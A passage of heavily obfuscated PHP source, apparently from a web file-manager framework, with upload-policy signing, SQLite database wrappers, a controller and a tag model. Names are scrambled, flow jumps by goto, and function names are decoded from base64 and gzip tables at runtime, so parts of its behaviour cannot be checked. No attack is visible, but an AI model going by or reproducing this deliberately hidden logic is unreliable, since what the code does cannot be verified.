$Dã°‰¾âˆí, $EİØ¦º §«[1157] => $this->accessKey, $EİØ¦º §«[1160] => $b±ãñíè¹–, $EİØ¦º §«[1161] => $b•Ñšæèè, $EİØ¦º §«[184] => $this->getHost()); goto cêà£òì²ë; BæÆ…ô²ã±: $E“¤¦½ˆ¼¿ = $EİØ¦º §«[1147]; $e‰ˆ³İ„‘ = gmdate($EİØ¦º §«[1148], time() + $BÇ£’„ ÷); $b±ãñíè¹– = (string) time() . $EİØ¦º §«[77] . (string) (time() + $BÇ£’„ ÷); goto e‹æÌØÜÉ×; a°µ¶ÍøÈí: $EİØ¦º §« =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C¢Í¢ÊŠ = $EİØ¦º §«[200]; $Dã°‰¾âˆí = $EİØ¦º §«[237]; goto BæÆ…ô²ã±; e‹æÌØÜÉ×: $f«•¿È…‹ = array($EİØ¦º §«[1149] => $e‰ˆ³İ„‘, $EİØ¦º §«[1150] => array(array($EİØ¦º §«[1151] => $C¢Í¢ÊŠ), array($EİØ¦º §«[1152] => $this->bucket), array($EİØ¦º §«[1153], $EİØ¦º §«[1154], $EİØ¦º §«[33]), array($EİØ¦º §«[1155] => $E“¤¦½ˆ¼¿), array($EİØ¦º §«[1156] => $Dã°‰¾âˆí), array($EİØ¦º §«[1157] => $this->accessKey), array($EİØ¦º §«[1158] => $b±ãñíè¹–))); $f«•¿È…‹ = json_encode($f«•¿È…‹); $bó‹øç‡ì = hash_hmac($EİØ¦º §«[237], $b±ãñíè¹–, $this->secret); goto f§›ê„›‚Ô; cêà£òì²ë: return $aÍ·ŒïßŸ‰; goto DÚŒ÷Ò£ÅÍ; DÚŒ÷Ò£ÅÍ: } public function fileOutLink($aãƒ† ô¤ë) { $Eù¸ÖÙÁß =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (substr($aãƒ† ô¤ë, 0, 7) == $Eù¸ÖÙÁß[1162]) { $aãƒ† ô¤ë = $Eù¸ÖÙÁß[1163] . substr($aãƒ† ô¤ë, 7); } header($Eù¸ÖÙÁß[168] . $aãƒ† ô¤ë); die; } } goto Bóìã­Î; B•¿£‡Œ¬: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto a˜ƒ©šê¢; Cï×ÙîÂ›: $this->tpl = TEMPLATE . MOD . $a‘ÃôÖĞ¡[8]; $this->_classObjectID = mt_rand(0, 10000); goto b¸ˆ»°Òö; bï –ÓĞÉ: $this->in =& $in; $this->values[$a‘ÃôÖĞ¡[6]] =& $config; $this->values[$a‘ÃôÖĞ¡[7]] =& $in; goto Cï×ÙîÂ›; a˜ƒ©šê¢: $a‘ÃôÖĞ¡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; global $in, $config; $this->config =& $config; goto bï –ÓĞÉ; b¸ˆ»°Òö: } public function loadClass($Fˆ’óœ†§İ) { if (1 === func_num_args()) { $this->{$Fˆ’óœ†§İ} = new $Fˆ’óœ†§İ(); } else { $EÊÅÀÕ¿³ğ = new ReflectionClass($Fˆ’óœ†§İ); $CãïÒ…Î«İ = func_get_args(); array_shift($CãïÒ…Î«İ); $this->{$Fˆ’óœ†§İ} = $EÊÅÀÕ¿³ğ->newInstanceArgs($CãïÒ…Î«İ); } return $this->{$Fˆ’óœ†§İ}; } protected function assign($BåŞÚÎƒ³, $dì°ö®¼ä¦) { $this->values[$BåŞÚÎƒ³] = $dì°ö®¼ä¦; } protected function display($aˆ±ö±æİ) { ob_end_clean(); extract($this->values); require $this->tpl . $aˆ±ö±æİ; } } class DbSqliteBase extends Db { public function __construct($D›áë„˜£ = '') { $fŠì«ïÈ‡ˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!extension_loaded($fŠì«ïÈ‡ˆ[9])) { think_exception(think_lang($fŠì«ïÈ‡ˆ[10]) . $fŠì«ïÈ‡ˆ[11]); } if (!empty($D›áë„˜£)) { if (!isset($D›áë„˜£[$fŠì«ïÈ‡ˆ[12]])) { $D›áë„˜£[$fŠì«ïÈ‡ˆ[12]] = 438; } $this->config = $D›áë„˜£; if (empty($this->config[$fŠì«ïÈ‡ˆ[13]])) { $this->config[$fŠì«ïÈ‡ˆ[13]] = array(); } } } public function connect($Eçñß¸³Ù = '', $D´Íİ£Ìä› = 0) { $eïÚ§˜« =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($this->linkID[$D´Íİ£Ìä›])) { goto d‘°ÍÁÅ’; d‘°ÍÁÅ’: if (empty($Eçñß¸³Ù)) { $Eçñß¸³Ù = $this->config; } $d¸Æò½œËÁ = !empty($Eçñß¸³Ù[$eïÚ§˜«[13]][$eïÚ§˜«[14]]) ? $Eçñß¸³Ù[$eïÚ§˜«[13]][$eïÚ§˜«[14]] : $this->pconnect; $Aæ‹áÊ’‰ = $d¸Æò½œËÁ ? $eïÚ§˜«[15] : $eïÚ§˜«[16]; goto cÕÌÏõôØÒ; cˆÊ‡Öö‘•: @sqlite_busy_timeout($this->linkID[$D´Íİ£Ìä›], 30000); if (1 != think_config($eïÚ§˜«[18])) { unset($this->config); } goto E‡¬Æ„Š‘Ú; cÕÌÏõôØÒ: $this->linkID[$D´Íİ£Ìä›] = $Aæ‹áÊ’‰($Eçñß¸³Ù[$eïÚ§˜«[17]], $Eçñß¸³Ù[$eïÚ§˜«[12]]); if (!$this->linkID[$D´Íİ£Ìä›]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cˆÊ‡Öö‘•; E‡¬Æ„Š‘Ú: } return $this->linkID[$D´Íİ£Ìä›]; } public function free() { $this->queryID = null; } public function query($eª÷Êµ’×ß) { goto F½ô©ƒ‘™; dÁšª‰«í¸: think_status($F’¼¢Çèá³[20]); $this->queryID = sqlite_query($this->_linkID, $eª÷Êµ’×ß); $this->debug(); goto EÂ•İİâœˆ; F½ô©ƒ‘™: $F’¼¢Çèá³ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÌ¦ë‡˜Æ; FÌ¦ë‡˜Æ: $this->queryStr = $eª÷Êµ’×ß; if ($this->queryID) { $this->free(); } think_action_status($F’¼¢Çèá³[19], 1); goto dÁšª‰«í¸; EÂ•İİâœˆ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $BøÖ±·º = $this->getAll(); return $BøÖ±·º; } goto FÇŒ¤ø‰‘; FÇŒ¤ø‰‘: } public function execute($E›é˜Ï¥×Ÿ) { goto bÉÕë¼å‚¸; F¥’…ï¥ÁØ: $this->queryStr = $E›é˜Ï¥×Ÿ; if ($this->queryID) { $this->free(); } think_action_status($B¹¾ˆç˜¶[21], 1); goto a‹²èæ·õˆ; añÙ›îÌ‘: if (!1 === $böŒÂâ¢¢Ñ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto DçÍìé­•Æ; bÉÕë¼å‚¸: $B¹¾ˆç˜¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F¥’…ï¥ÁØ; a‹²èæ·õˆ: think_status($B¹¾ˆç˜¶[20]); $böŒÂâ¢¢Ñ = sqlite_exec($this->_linkID, $E›é˜Ï¥×Ÿ); $this->debug(); goto añÙ›îÌ‘; DçÍìé­•Æ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[í¤âËÚ£¶íÊ¢][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BµÃ‹†¤­× = sqlite_query($this->_linkID, $_SERVER[í¤âËÚ£¶íÊ¢][23]); if (!$BµÃ‹†¤­×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $E²İÕŠ‚Û = sqlite_query($this->_linkID, $_SERVER[í¤âËÚ£¶íÊ¢][24]); if (!$E²İÕŠ‚Û) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $DÉñÅÙŠ¹ = array(); if ($this->numRows > 0) { for ($eñ±„¼˜ê˜ = 0; $eñ±„¼˜ê˜ < $this->numRows; $eñ±„¼˜ê˜++) { $DÉñÅÙŠ¹[$eñ±„¼˜ê˜] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $DÉñÅÙŠ¹; } public function getFields($b‰¬ï–é¤Ø) { $béÂº±ËŒº =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A…Ñ…‹ô„‚ = $this->query($béÂº±ËŒº[25] . $b‰¬ï–é¤Ø . $béÂº±ËŒº[26]); $C•†«œ–› = array(); if ($A…Ñ…‹ô„‚) { foreach ($A…Ñ…‹ô„‚ as $A×ÉÓà†Ø¤ => $B³äãğØ) { $C•†«œ–›[$B³äãğØ[$béÂº±ËŒº[27]]] = array($béÂº±ËŒº[28] => $B³äãğØ[$béÂº±ËŒº[27]], $béÂº±ËŒº[29] => $B³äãğØ[$béÂº±ËŒº[30]], $béÂº±ËŒº[31] => (bool) ($B³äãğØ[$béÂº±ËŒº[32]] === $béÂº±ËŒº[33]), $béÂº±ËŒº[34] => $B³äãğØ[$béÂº±ËŒº[35]], $béÂº±ËŒº[36] => strtolower($B³äãğØ[$béÂº±ËŒº[37]]) == $béÂº±ËŒº[38], $béÂº±ËŒº[39] => strtolower($B³äãğØ[$béÂº±ËŒº[40]]) == $béÂº±ËŒº[41]); } } return $C•†«œ–›; } public function getTables($a‚èÆİ‹Ú = '') { $bÔÌÍÉ¸Õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E’…Š‡µß = $this->query($bÔÌÍÉ¸Õ[42] . $bÔÌÍÉ¸Õ[43] . $bÔÌÍÉ¸Õ[44]); $F“Èë•‡ƒ¿ = array(); foreach ($E’…Š‡µß as $Déõ°ºÒ„‡ => $aëó•ŒŒŒà) { $F“Èë•‡ƒ¿[$Déõ°ºÒ„‡] = current($aëó•ŒŒŒà); } return $F“Èë•‡ƒ¿; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Aœ÷ÑÓôˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dƒ÷ÓŸ… = sqlite_last_error($this->_linkID); $this->error = $Dƒ÷ÓŸ… . $Aœ÷ÑÓôˆ[4] . sqlite_error_string($Dƒ÷ÓŸ…); if ($Aœ÷ÑÓôˆ[33] != $this->queryStr) { $this->error .= LNG($Aœ÷ÑÓôˆ[45]) . $this->queryStr; } think_trace($this->error, $Aœ÷ÑÓôˆ[33], $Aœ÷ÑÓôˆ[46]); return $this->error; } public function escapeString($f¸Àá‘‹âÔ) { return sqlite_escape_string($f¸Àá‘‹âÔ); } public function parseLimit($BâìƒÈ·”Ù) { $AŞ¸¾¯©‚ò =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÊÑÕ¸òÉƒ = $AŞ¸¾¯©‚ò[33]; if (!empty($BâìƒÈ·”Ù)) { $BâìƒÈ·”Ù = explode($AŞ¸¾¯©‚ò[47], $BâìƒÈ·”Ù); if (count($BâìƒÈ·”Ù) > 1) { $EÊÑÕ¸òÉƒ .= $AŞ¸¾¯©‚ò[48] . $BâìƒÈ·”Ù[1] . $AŞ¸¾¯©‚ò[49] . $BâìƒÈ·”Ù[0] . $AŞ¸¾¯©‚ò[50]; } else { $EÊÑÕ¸òÉƒ .= $AŞ¸¾¯©‚ò[48] . $BâìƒÈ·”Ù[0] . $AŞ¸¾¯©‚ò[50]; } } return $EÊÑÕ¸òÉƒ; } } class DbSqlite3Base extends Db { public function __construct($cÓì‘‘¥²È = '') { $cÂ–•»‹­ğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!class_exists($cÂ–•»‹­ğ[51])) { think_exception(think_lang($cÂ–•»‹­ğ[10]) . $cÂ–•»‹­ğ[52]); } if (!empty($cÓì‘‘¥²È)) { if (!isset($cÓì‘‘¥²È[$cÂ–•»‹­ğ[12]])) { $cÓì‘‘¥²È[$cÂ–•»‹­ğ[12]] = 438; } $this->config = $cÓì‘‘¥²È; if (empty($this->config[$cÂ–•»‹­ğ[13]])) { $this->config[$cÂ–•»‹­ğ[13]] = array(); } } } public function connect($C“ëÏ×¢½³ = '', $E¢ááƒŒİ = 0) { $f¤†¬ÉÅ‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($this->linkID[$E¢ááƒŒİ])) { if (empty($C“ëÏ×¢½³)) { $C“ëÏ×¢½³ = $this->config; } $this->linkID[$E¢ááƒŒİ] = new SQLite3($C“ëÏ×¢½³[$f¤†¬ÉÅ‘[17]]); if (!$this->linkID[$E¢ááƒŒİ]) { think_exception($this->linkID[$E¢ááƒŒİ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$E¢ááƒŒİ]->busyTimeout(30000); if (1 != think_config($f¤†¬ÉÅ‘[18])) { unset($this->config); } } return $this->linkID[$E¢ááƒŒİ]; } public function free() { $this->queryID = null; } public function query($b¸ñ·Ú©¥) { goto fİ”àĞ²Å; fİ”àĞ²Å: $bìğ¥ÔŒ·ğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÉôø¯œºî; AáÒÓà­½˜: think_status($bìğ¥ÔŒ·ğ[20]); $this->queryID = $this->_linkID->query($b¸ñ·Ú©¥); $this->debug(); goto c½÷‡ˆ¾—; CÉôø¯œºî: $this->queryStr = $b¸ñ·Ú©¥; if ($this->queryID) { $this->free(); } think_action_status($bìğ¥ÔŒ·ğ[19], 1); goto AáÒÓà­½˜; c½÷‡ˆ¾—: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aœÛì¹›Ü = $this->getAll(); $this->numRows = count($aœÛì¹›Ü); return $aœÛì¹›Ü; } goto e«Æ˜Š®¹È; e«Æ˜Š®¹È: } public function execute($FÉ‘‰¡³ÙŠ) { goto B­âìŞÄˆÊ; B­âìŞÄˆÊ: $døˆ—Ú¾ÄÊ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d’†å´¼ñá; a™Î£áÚ—ª: if (!1 === $cÁÂ‘¥œëƒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DîèˆÉÅ; cÜ¢ØÁÈ: think_status($døˆ—Ú¾ÄÊ[20]); $cÁÂ‘¥œëƒ = $this->_linkID->exec($FÉ‘‰¡³ÙŠ); $this->debug(); goto a™Î£áÚ—ª; d’†å´¼ñá: $this->queryStr = $FÉ‘‰¡³ÙŠ; if ($this->queryID) { $this->free(); } think_action_status($døˆ—Ú¾ÄÊ[21], 1); goto cÜ¢ØÁÈ; DîèˆÉÅ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[í¤âËÚ£¶íÊ¢][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C„ÇˆÌ´½Ø = $this->_linkID->query($_SERVER[í¤âËÚ£¶íÊ¢][23]); if (!$C„ÇˆÌ´½Ø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Fåæ™÷éâ = $this->_linkID->query($_SERVER[í¤âËÚ£¶íÊ¢][24]); if (!$Fåæ™÷éâ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $dÚæÚ¢¶ÒÂ = array(); while ($AÚñ×”ÊÆ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $dÚæÚ¢¶ÒÂ[] = $AÚñ×”ÊÆ; } $this->queryID->reset(); return $dÚæÚ¢¶ÒÂ; } public function getFields($CŸ×õÓñ‚Í) { $Aóä´Å¼Ï© =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b¥ÌÏµÇ = $this->query($Aóä´Å¼Ï©[25] . $CŸ×õÓñ‚Í . $Aóä´Å¼Ï©[26]); $Dà´×óõ¬İ = array(); if ($b¥ÌÏµÇ) { foreach ($b¥ÌÏµÇ as $d¿ª·µÁÏĞ => $F¬†„Ñ©ƒÒ) { $Dà´×óõ¬İ[$F¬†„Ñ©ƒÒ[$Aóä´Å¼Ï©[28]]] = array($Aóä´Å¼Ï©[28] => $F¬†„Ñ©ƒÒ[$Aóä´Å¼Ï©[28]], $Aóä´Å¼Ï©[29] => $F¬†„Ñ©ƒÒ[$Aóä´Å¼Ï©[29]], $Aóä´Å¼Ï©[31] => (bool) ($F¬†„Ñ©ƒÒ[$Aóä´Å¼Ï©[31]] === $Aóä´Å¼Ï©[33]), $Aóä´Å¼Ï©[34] => $F¬†„Ñ©ƒÒ[$Aóä´Å¼Ï©[53]], $Aóä´Å¼Ï©[36] => (bool) $F¬†„Ñ©ƒÒ[$Aóä´Å¼Ï©[54]], $Aóä´Å¼Ï©[39] => (bool) $F¬†„Ñ©ƒÒ[$Aóä´Å¼Ï©[54]]); } } return $Dà´×óõ¬İ; } public function getTables($eŒù’³Ğ½† = '') { $Dï«‹„Á»ó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d‚©½¥Ù« = $this->query($Dï«‹„Á»ó[42] . $Dï«‹„Á»ó[43] . $Dï«‹„Á»ó[44]); $fÕœøß‚¿ = array(); foreach ($d‚©½¥Ù« as $E›Á ÷ì® => $e“ª ±´”‹) { $fÕœøß‚¿[$E›Á ÷ì®] = current($e“ª ±´”‹); } return $fÕœøß‚¿; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $c×ÓÌõÊšÊ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->error = $this->_linkID->lastErrorMsg(); if ($c×ÓÌõÊšÊ[33] != $this->queryStr) { $this->error .= LNG($c×ÓÌõÊšÊ[45]) . $this->queryStr; } think_trace($this->error, $c×ÓÌõÊšÊ[33], $c×ÓÌõÊšÊ[46]); return $this->error; } public function escapeString($Dà•››¿áÈ) { $f²´†È®…¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->_linkID) { return $this->_linkID->escapeString($Dà•››¿áÈ); } return str_ireplace($f²´†È®…¿[55], $f²´†È®…¿[56], $Dà•››¿áÈ); } public function parseLimit($Fñ­­½²–‘) { $Aê½¶÷è©¼ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D‡…²İ‚§› = $Aê½¶÷è©¼[33]; if (!empty($Fñ­­½²–‘)) { $Fñ­­½²–‘ = explode($Aê½¶÷è©¼[47], $Fñ­­½²–‘); if (count($Fñ­­½²–‘) > 1) { $D‡…²İ‚§› .= $Aê½¶÷è©¼[48] . $Fñ­­½²–‘[1] . $Aê½¶÷è©¼[49] . $Fñ­­½²–‘[0] . $Aê½¶÷è©¼[50]; } else { $D‡…²İ‚§› .= $Aê½¶÷è©¼[48] . $Fñ­­½²–‘[0] . $Aê½¶÷è©¼[50]; } } return $D‡…²İ‚§›; } } goto a¡ÃÁŞßÑ; A½¯›ÆëÆ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\x74\x61\147\x4c\x69\163\x74"; public $modelType = "\x55\x73\x65\x72\117\160\164\151\157\156"; public $field = array("\156\x61\x6d\x65", "\x73\x74\171\154\145", "\163\x6f\x72\164"); public function listData($eªÕ‹ĞöÜ = false, $b¨ñ©ËÎ˜× = "\x73\x6f\162\x74", $DÜàÃ‹ßÂ = false) { return parent::listData($eªÕ‹ĞöÜ, $b¨ñ©ËÎ˜×, $DÜàÃ‹ßÂ); } public function remove($bª¤òª–‹) { return parent::remove($bª¤òª–‹); } public function add($d·ÆßËŠ´¨, $Bğóˆø»§é = "\154\x61\142\145\x6c\x2d\147\x72\145\x79\x2d\x6e\x6f\x72\155\141\x6c") { $Dª¼Ô‡‡øÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->findByName($d·ÆßËŠ´¨)) { return !1; } $cÓÅµñ£Ş = array($Dª¼Ô‡‡øÖ[416] => $d·ÆßËŠ´¨, $Dª¼Ô‡‡øÖ[467] => $Bğóˆø»§é, $Dª¼Ô‡‡øÖ[1654] => $this->getSort($Dª¼Ô‡‡øÖ[263]) + 1); return parent::insert($cÓÅµñ£Ş); } public function update($BÏ‹‹ÅôŞ, $fœÀ­õèâª) { $EÖÁÆœ½‹­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DŞÃ´½ÔÒå = $this->listData($BÏ‹‹ÅôŞ); $E¾Œ×ä‘‘ = $this->findByName($fœÀ­õèâª[$EÖÁÆœ½‹­[28]]); if (!$DŞÃ´½ÔÒå || $E¾Œ×ä‘‘ && $E¾Œ×ä‘‘[$EÖÁÆœ½‹­[397]] != $DŞÃ´½ÔÒå[$EÖÁÆœ½‹­[397]]) { return !1; } return parent::update($BÏ‹‹ÅôŞ, $fœÀ­õèâª); } public function moveTop($aÑŸÇ¼Ç¶Û) { $CŸÚî™ÓÜ¼ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F¸§í×¥¬ = parent::listData(); $b”©‹¾ëùä = $this->getSort($CŸÚî™ÓÜ¼[262]); foreach ($F¸§í×¥¬ as &$c–ß¬±›ĞÌ) { if ($c–ß¬±›ĞÌ[$CŸÚî™ÓÜ¼[397]] == $aÑŸÇ¼Ç¶Û) { $c–ß¬±›ĞÌ[$CŸÚî™ÓÜ¼[1673]] = $b”©‹¾ëùä; continue; } $c–ß¬±›ĞÌ[$CŸÚî™ÓÜ¼[1673]] += 1; } unset($c–ß¬±›ĞÌ); return parent::resetData($F¸§í×¥¬); } public function moveBottom($f…Çƒ£Ò) { $C¦íÔ½¿éÏ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B¿ÖåÒ‡± = $this->getSort($C¦íÔ½¿éÏ[263]) + 1; return parent::update($f…Çƒ£Ò, array($C¦íÔ½¿éÏ[1673] => $B¿ÖåÒ‡±)); } public function resetSort($D¡ùõƒî…) { goto c¼äÒ·®„½; a‡òĞù×Ä»: unset($E–­àÆ¹); return parent::resetData($dŠÃÌÍêà); goto BÓÅÔ¿ŒŠë; C«Ñ†ê›Æ‰: for ($bá²¤®Š®Â = 0; $bá²¤®Š®Â < count($D¡ùõƒî…); $bá²¤®Š®Â++) { $e“¹¬İïôñ[$D¡ùõƒî…[$bá²¤®Š®Â] . $AŞÚÃİÕ¥»[33]] = $bá²¤®Š®Â + 1; } $dŠÃÌÍêà = parent::listData(); foreach ($dŠÃÌÍêà as &$E–­àÆ¹) { $dŠ™ãà¯ İ = $e“¹¬İïôñ[$E–­àÆ¹[$AŞÚÃİÕ¥»[397]]]; $E–­àÆ¹[$AŞÚÃİÕ¥»[1673]] = $dŠ™ãà¯ İ ? $dŠ™ãà¯ İ : $E–­àÆ¹[$AŞÚÃİÕ¥»[1673]]; } goto a‡òĞù×Ä»; c¼äÒ·®„½: $AŞÚÃİÕ¥» =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e“¹¬İïôñ = array(); $D¡ùõƒî… = is_array($D¡ùõƒî…) ? $D¡ùõƒî… : array(); goto C«Ñ†ê›Æ‰; BÓÅÔ¿ŒŠë: } private function getSort($b±œŠÀÅ½) { $BğÉ¢Ï‡ºİ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dâö´¯ Õ† = parent::listData(); $E“«Íƒ˜®æ = array_to_keyvalue($Dâö´¯ Õ†, $BğÉ¢Ï‡ºİ[33], $BğÉ¢Ï‡ºİ[1673]); if (!$E“«Íƒ˜®æ) { $E“«Íƒ˜®æ = array(0); } $B—š¾ = $b±œŠÀÅ½ == $BğÉ¢Ï‡ºİ[263] ? max($E“«Íƒ˜®æ) : min($E“«Íƒ˜®æ); return intval($B—š¾); } } goto aÎÑô¶íÆ; E•±ÚõÇî÷: $DÀ­»Ÿ¡ºÀ = strrev(base64_decode($_SERVER[Å€ÍÈ¹­Ï•Âœ][0])); function binCheckNeq($C‚Ğ¾Šˆ‡, $f‹¢Ş„¦£) { return $C‚Ğ¾Šˆ‡ != $f‹¢Ş„¦£; } $_SERVER[$_SERVER[Å€ÍÈ¹­Ï•Âœ][1]] = $DÀ­»Ÿ¡ºÀ($_SERVER[$_SERVER[Å€ÍÈ¹­Ï•Âœ][2]]); goto aƒšĞäÌôŞ; b‹Ü‹ÀÑáã: $_SERVER[²—Ä] = explode($_SERVER[í¤âËÚ£¶íÊ¢][579], gzinflate(substr($_SERVER[í¤âËÚ£¶íÊ¢][580], 10, -8))); $C ƒô¹àË = $_SERVER[í¤âËÚ£¶íÊ¢][581]; class Application { private $defaultModule = "\x69\156\144\x65\x78"; private $defaultController = "\x69\156\x64\145\x78"; private $defaultAction = "\x69\x6e\144\x65\170"; function __construct() { } public function setDefault($A¥²Õ±¹¤) { goto BÆ¼å„; d“½·ö²‹ã: $this->defaultModule = $E¼¸÷›¤æŒ[0] ? $E¼¸÷›¤æŒ[0] : $this->defaultModule; $c›Ññ‹³ÃŞ = $d£„ÏîŒ“[582]; $this->defaultController = $E¼¸÷›¤æŒ[1] ? $E¼¸÷›¤æŒ[1] : $this->defaultController; goto E é÷ÈºÙ®; E é÷ÈºÙ®: $this->defaultAction = $E¼¸÷›¤æŒ[2] ? $E¼¸÷›¤æŒ[2] : $this->defaultAction; $eŒ‰³õ¼¨® = $d£„ÏîŒ“[583]; while ($eŒ‰³õ¼¨® < $d£„ÏîŒ“[584]) { if ($eŒ‰³õ¼¨® >= 0) { break; } $eŒ‰³õ¼¨®++; } goto eÂßÂğéÆ; BÆ¼å„: $d£„ÏîŒ“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aˆÔì˜åÂö =& $_SERVER[²—Ä]; $E¼¸÷›¤æŒ = $aˆÔì˜åÂö[0]($aˆÔì˜åÂö[1], $aˆÔì˜åÂö[2]($A¥²Õ±¹¤, $aˆÔì˜åÂö[1])); goto d“½·ö²‹ã; eÂßÂğéÆ: $this->{$_SERVER[²—Ä][3]}($aˆÔì˜åÂö[4], array($this, $aˆÔì˜åÂö[5])); goto AÏ¡èğ³Õ; AÏ¡èğ³Õ: } public function appRun($FŸÛƒëÍÁÅ) { goto aŠÔÒ£Ôñ; c‘ôÇ¡‰Šå: $fÒÔï¤…– = $d‚ù¿æÏ…ƒ[586]; if (strlen($fÒÔï¤…–) < $d‚ù¿æÏ…ƒ[587]) { return; } $B®ó¡ª = $AãÇ‘Ñ¶Ø[7]; goto a°ºÃˆ©“; aŠÔÒ£Ôñ: $d‚ù¿æÏ…ƒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AãÇ‘Ñ¶Ø =& $_SERVER[²—Ä]; $Aãëöö¬º¬ = $AãÇ‘Ñ¶Ø[0]($AãÇ‘Ñ¶Ø[1], $FŸÛƒëÍÁÅ); goto e…Ã™­Ô…; a°ºÃˆ©“: $AòäÉ©˜½º = $d‚ù¿æÏ…ƒ[588]; if (!$AòäÉ©˜½º) { return; } if ($dÈÈÙË‘¡“ == $AãÇ‘Ñ¶Ø[8]) { $B®ó¡ª = $AãÇ‘Ñ¶Ø[9]; $Aãëöö¬º¬[0] = $AãÇ‘Ñ¶Ø[10]; $Aãëöö¬º¬[1] = $Aãëöö¬º¬[1] . $AãÇ‘Ñ¶Ø[11]; $FŸÛƒëÍÁÅ = $AãÇ‘Ñ¶Ø[12]($AãÇ‘Ñ¶Ø[1], $Aãëöö¬º¬); $FŸÛƒëÍÁÅ = $AãÇ‘Ñ¶Ø[2]($FŸÛƒëÍÁÅ, $AãÇ‘Ñ¶Ø[1]); } goto B¶È¥Úì¹§; e…Ã™­Ô…: $dÔ¯¦Ö¡áô = $d‚ù¿æÏ…ƒ[585]; if (!$dÔ¯¦Ö¡áô) { return; } $dÈÈÙË‘¡“ = $AãÇ‘Ñ¶Ø[6]($Aãëöö¬º¬[0]); goto c‘ôÇ¡‰Šå; B¶È¥Úì¹§: $AãÇ‘Ñ¶Ø[13](array($AãÇ‘Ñ¶Ø[14], $AãÇ‘Ñ¶Ø[15]), $B®ó¡ª . $AãÇ‘Ñ¶Ø[16], $FŸÛƒëÍÁÅ); $AãÇ‘Ñ¶Ø[17]($FŸÛƒëÍÁÅ); $cšÏŒïá½Í = $d‚ù¿æÏ…ƒ[589]; goto EÑò¦«ïâ¿; EÑò¦«ïâ¿: while (strlen($cšÏŒïá½Í) < $d‚ù¿æÏ…ƒ[590]) { if (!$cšÏŒïá½Í) { break; } $cšÏŒïá½Í++; } $AãÇ‘Ñ¶Ø[13](array($AãÇ‘Ñ¶Ø[14], $AãÇ‘Ñ¶Ø[15]), $B®ó¡ª . $AãÇ‘Ñ¶Ø[18], $FŸÛƒëÍÁÅ); goto AŸ×‹†èØ; AŸ×‹†èØ: } private function autorun() { $eØïÖ‘¦ùŠ =& $_SERVER[²—Ä]; global $config; if ($eØïÖ‘¦ùŠ[19]($config[$eØïÖ‘¦ùŠ[20]]) == 0) { return; } foreach ($config[$eØïÖ‘¦ùŠ[20]] as $e»‰ƒŠÄ¶ => $fĞê™Äª¾Ñ) { $this->{$_SERVER[²—Ä][21]}($fĞê™Äª¾Ñ); $e¨°ËŸîï£ = $_SERVER[í¤âËÚ£¶íÊ¢][591]; if (!$e¨°ËŸîï£) { return; } } } private function endb37a919b8() { goto bËíÙˆÍÚ§; F–à§ŸÂ¸ç: if (strlen($EâÑ‹áø) < $Bò‡ØÀÀ³ñ[64]) { return; } if (!$d§öî«–éÏ || $DòŞ¬†¶ïË[24]($d§öî«–éÏ) <= $DòŞ¬†¶ïË[24]($eôÔßŒ)) { return; } if ($DòŞ¬†¶ïË[6]($DòŞ¬†¶ïË[25]($d§öî«–éÏ, 